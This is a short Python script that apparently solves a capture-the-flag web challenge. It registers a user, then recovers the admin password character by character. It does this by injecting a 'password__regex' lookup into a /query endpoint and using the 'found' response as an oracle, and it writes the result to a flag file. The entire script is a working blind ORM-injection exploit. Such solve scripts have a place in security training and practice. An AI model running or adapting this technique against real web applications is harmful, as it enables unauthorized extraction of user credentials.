import requests
import re
from string import printable

session = requests.Session()

def get(url: str, params: dict = {}) -> requests.Response:
    return session.get(url=url,
        params=params
    )

def post(url: str, data: dict = {}) -> requests.Response:
    # print(session.cookies.get('csrftoken', ''))
    return session.post(
        url=url,
        headers={
            "X-CSRFToken": session.cookies.get('csrftoken', '')
        },
        data=data
    )

def main():
    # GET csrf token then register
    get('http://challenge:8000/register')
    post('http://challenge:8000/register', data={'username': 'test2', 'password': 'test2'})

    # Find password
    pwd = ''
    found = False 
    while True:
        for c in printable:
            found = False
            guess = pwd + c

            # Get CSRF token
            get('http://challenge:8000')

            count = 2
            error = False
            while True:
                r = post(
                    "http://challenge:8000/query", 
                    data={
                        'username': 'admin',
                        'password__regex': str(r'^' + re.escape(guess)),
                    }
                )
                if r.status_code == 200: break
                count -= 1
                if count == 0:
                    error = True
                    break

            if error:
                print('Unexpected server response.')
                exit(1) 
            
            content = r.json()
            if content is not None and content.get('found') == True:
                pwd += c
                found = True
                break

        if not found: 
            break
    
    # Write flag to file
    with open("./flag", "w") as w:
        w.write(pwd)

if __name__ == "__main__":
    main()